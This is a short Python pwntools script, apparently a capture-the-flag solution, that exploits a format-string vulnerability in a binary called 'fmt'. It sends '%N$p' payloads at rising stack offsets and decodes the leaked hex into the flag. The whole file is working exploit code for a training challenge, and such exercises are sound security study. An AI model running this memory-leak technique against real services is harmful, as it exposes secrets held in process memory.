from pwn import *

io = process("./fmt")
#io = remote("node5.anna.nssctf.cn", 27663)

# offset = 8
offset = 8 + 4
flag = ""
running = True
while running:
    payload = f"%{offset}$p"
    io.sendlineafter(b"service", payload)
    io.recvuntil(b"0x")
    ascii_stream = io.recvuntil(b"\n")[:-1]
    for i in range(0, len(ascii_stream), 2):
        index = len(ascii_stream) - i
        b = chr(int(ascii_stream[index - 2 : index].ljust(2, b"0"), 16))
        flag += b
        if b == "}":
            running = False

    offset += 1

print(flag)
io.interactive()
